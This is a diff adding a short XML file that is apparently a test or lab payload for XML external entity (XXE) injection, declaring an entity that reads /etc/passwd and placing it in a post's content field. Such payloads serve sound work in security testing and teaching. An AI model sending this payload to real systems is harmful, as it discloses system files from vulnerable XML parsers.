@@ -1,0 +1,8 @@
+<!DOCTYPE xxe [
+        <!ENTITY externalEntity SYSTEM "/etc/passwd">
+]>
+<post>
+    <author>mswiderek</author>
+    <topic>XXE</topic>
+    <content>&externalEntity;</content>
+</post>
